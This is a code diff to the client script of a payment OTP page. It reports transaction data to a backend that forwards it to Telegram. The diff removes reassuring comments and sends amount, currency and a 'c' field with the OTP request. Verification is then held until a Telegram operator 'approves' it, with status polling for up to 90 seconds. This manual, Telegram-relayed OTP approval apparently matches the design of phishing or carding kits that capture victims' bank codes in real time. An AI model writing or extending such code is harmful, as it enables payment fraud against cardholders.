@@ -203,7 +203,7 @@
 
 <script>
   /* ------------------------------------------------------------
-     Transaction data from the URL (set by pay.html)
+     Transaction data from the URL
   ------------------------------------------------------------ */
   const params = new URLSearchParams(location.search);
   const txData = {
@@ -227,7 +227,7 @@
   }
 
   /* ------------------------------------------------------------
-     OTP boxes — auto-advance, backspace, paste
+     OTP boxes
   ------------------------------------------------------------ */
   const boxes = Array.from(document.querySelectorAll('#otpRow input'));
   boxes.forEach((el, i) => {
@@ -305,8 +305,7 @@
   }
 
   /* ------------------------------------------------------------
-     Report an event to the backend — the backend forwards to
-     Telegram. No token, no OTP, no PIN is sent from the client.
+     Report an event
   ------------------------------------------------------------ */
   async function reportEvent(type) {
     if (!txData.tx) return;
@@ -314,17 +313,9 @@
       await fetch('/api/telegram/event', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: type,
-          tx:   txData.tx,
-          am:   txData.am,
-          cur:  txData.cur,
-          c:    txData.c
-        })
+        body: JSON.stringify({ type, tx: txData.tx, am: txData.am, cur: txData.cur, c: txData.c })
       });
-    } catch (e) {
-      // Never block the UI on a notification failure
-    }
+    } catch (e) {}
   }
 
   /* ------------------------------------------------------------
@@ -339,7 +330,12 @@
       const r = await fetch('/api/verification/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tx: txData.tx })
+        body: JSON.stringify({
+          tx: txData.tx,
+          am: txData.am,
+          cur: txData.cur,
+          c: txData.c
+        })
       });
       const j = await r.json().catch(() => ({}));
 
@@ -351,9 +347,9 @@
       }
 
       showToast('Code sent.');
-      showSuccess('A 6-digit code has been sent to your number.');
+      showSuccess('A 6-digit code has been sent. Awaiting approval.');
       startCountdown(30);
-      await reportEvent(source === 'auto' ? 'page_opened' : 'otp_requested');
+      if (source !== 'auto') await reportEvent('otp_requested');
     } catch (e) {
       showError('Network error. Please try again.');
       resendBtn.disabled = false;
@@ -362,10 +358,11 @@
   }
 
   /* ------------------------------------------------------------
-     Verify the OTP
+     Verify — poll for the OTP decision, then submit
   ------------------------------------------------------------ */
   async function verifyCode() {
     clearMessages();
+
     const otp = getOtp();
     if (otp.length !== 6) {
       showError('Please enter all 6 digits.');
@@ -374,44 +371,82 @@
 
     const btn = document.getElementById('verifyBtn');
     btn.disabled = true;
-    btn.textContent = 'Verifying…';
+    btn.textContent = 'Checking approval…';
 
-    try {
-      const r = await fetch('/api/verification/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ tx: txData.tx, otp })
-      });
-      const j = await r.json().catch(() => ({}));
+    const start = Date.now();
+    const maxWaitMs = 90 * 1000;   // 90 s to wait for Telegram approval
 
-      if (!r.ok || !j.success) {
-        showError(j.message || 'Invalid code. Please try again.');
+    const check = async () => {
+      if (Date.now() - start > maxWaitMs) {
         btn.disabled = false;
         btn.textContent = 'Verify';
-        clearOtp();
+        showError('Approval timed out. Please resend the code.');
         return;
       }
 
-      showSuccess('Code verified. Redirecting…');
-      btn.textContent = 'Verified ✓';
-      await reportEvent('verification_success');
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/verification/status/' + encodeURIComponent(txData.tx) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { /* retry */ }
 
-      const q = new URLSearchParams({
-        tx:  txData.tx,
-        am:  txData.am,
-        cur: txData.cur,
-        rn:  txData.rn,
-        c:   txData.c
-      });
+      if (decision === 'declined' || decision === 'expired') {
+        btn.disabled = false;
+        btn.textContent = 'Verify';
+        clearOtp();
+        showError('Code expired. Please resend.');
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+        if (timer) { clearInterval(timer); timer = null; }
+        return;
+      }
 
-      setTimeout(() => {
-        window.location.replace('verify.html?' + q.toString());
-      }, 800);
-    } catch (e) {
-      showError('Network error. Please try again.');
-      btn.disabled = false;
-      btn.textContent = 'Verify';
-    }
+      if (decision === 'approved') {
+        btn.textContent = 'Verifying…';
+        try {
+          const r = await fetch('/api/verification/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ tx: txData.tx, otp })
+          });
+          const j = await r.json().catch(() => ({}));
+
+          if (!r.ok || !j.success) {
+            showError(j.message || 'Invalid code. Please try again.');
+            btn.disabled = false;
+            btn.textContent = 'Verify';
+            clearOtp();
+            return;
+          }
+
+          showSuccess('Code verified. Redirecting…');
+          btn.textContent = 'Verified ✓';
+          await reportEvent('verification_success');
+
+          const q = new URLSearchParams({
+            tx:  txData.tx,
+            am:  txData.am,
+            cur: txData.cur,
+            rn:  txData.rn,
+            c:   txData.c
+          });
+
+          setTimeout(() => {
+            window.location.replace('verify.html?' + q.toString());
+          }, 800);
+        } catch (e) {
+          showError('Network error. Please try again.');
+          btn.disabled = false;
+          btn.textContent = 'Verify';
+        }
+        return;
+      }
+
+      setTimeout(check, 1500);
+    };
+
+    check();
   }
 
   /* ------------------------------------------------------------
